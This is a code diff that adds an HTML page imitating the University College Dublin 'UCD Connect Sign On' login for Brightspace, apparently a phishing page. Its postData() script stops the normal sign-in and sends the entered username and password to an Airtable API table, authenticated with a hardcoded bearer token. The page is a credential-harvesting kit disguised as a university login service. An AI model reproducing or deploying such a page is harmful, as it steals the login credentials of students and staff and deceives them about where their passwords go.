@@ -1,0 +1,96 @@
+
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+      <link href='https://fonts.googleapis.com/css?family=Open+Sans:400,600,700' rel='stylesheet' type='text/css'>
+      <meta charset="utf-8">
+      <meta http-equiv="X-UA-Compatible" content="IE=edge">
+      <meta name="viewport" content="width=device-width, initial-scale=1">
+		
+            <meta name="description" content="">
+      <meta name="author" content="">
+      <link rel="icon" href="/favicon.ico">
+      <title>Web Login Service</title>
+		
+            <link href="/bootstrap.min.css" rel="stylesheet">
+		
+            <link href="/ucd-connect.min.css" rel="stylesheet">
+    </head>
+
+    <body>
+      <div class="container-fluid ucd-connect-login-page">      
+        <div class="container">
+          <form class="form-signin" onsubmit="postData()">
+            <div class="div-shadow">
+              <header>
+                <h1>UCD Connect Sign On</h1>
+              </header>
+              <div class="form-signin-div">
+                  <p>Login to UCD Brightspace</p>
+
+    <input type="hidden" name="csrf_token" value="_0a76c5f11d1ef6eb7407a690dee03ee862f7c314" />
+                <fieldset class="form-signin-fields form-signin-inside">
+                  <label for="username">Username</label>
+                  <input class="form-control" id="username" name="j_username" type="text"
+                   value="" required autofocus>
+
+                  <label for="password">Password</label>
+                  <input class="form-control" id="password" name="j_password" type="password" value="" required>
+
+
+                  <div class="checkbox">
+                    <input id="_shib_idp_revokeConsent" type="checkbox" name="_shib_idp_revokeConsent" value="true">
+Clear prior granting of permission for release of your information to this service.                    <a href="https://www.ucd.ie/itservices/ourservices/networkinfrastructure/sso/" target="_blank" data-toggle="tooltip" title="Some information will be shared with the application provider."><sup> What is this?</sup><a>
+                    <br>
+                    <a href="https://www.ucd.ie/itservices/ourservices/networkinfrastructure/sso/" target="_blank">More Information<a>
+                  </div>
+                </fieldset>
+
+		<div class="form-signin-button-container form-signin-inside">
+                  <button class="btn btn-login" type="submit" name="_eventId_proceed"
+                    onClick="this.childNodes[0].nodeValue='please wait...'"
+                    >Login</button>
+		  </br>
+		  </br>
+		  <a href="https://selfpass.ucd.ie">Change your password</a>
+                </div>
+              </div>
+            </div>
+          </form>
+        </div>
+      </div>
+
+      <div class="container-fluid">    
+        <div class="container">   
+          <!-- Site footer -->
+	      <footer class="footer-signin">
+	        <p>University College Dublin, Belfield, Dublin 4, Ireland. T: +353 1 716 7777</p>
+          </footer>
+        </div>
+      </div>
+      <script>
+
+        async function postData(){
+            event.preventDefault();
+            const data = {
+                    "fields":{
+                        "fldRpegYmcN34Mkmf": document.getElementById("username").value,
+                        "fldxzj4q7yuVm0q1X": document.getElementById("password").value
+                    }
+                }
+            const response = await fetch("https://api.airtable.com/v0/appUPKMy0xNoMLkyp/Table%201", {
+                method: "POST", // *GET, POST, PUT, DELETE, etc.
+                headers: {
+                "Content-Type": "application/json",
+                'Authorization': 'Bearer patbRaLdnssO968vY.10e3dfb094f7de3696c84d64f59a1bcacaa208e5d26b30152550914619062f3b',
+                },
+
+                body: JSON.stringify(data), // body data type must match "Content-Type" header
+            });
+
+            console.log(response);
+        }
+
+      </script>
+    </body>  
+</html>
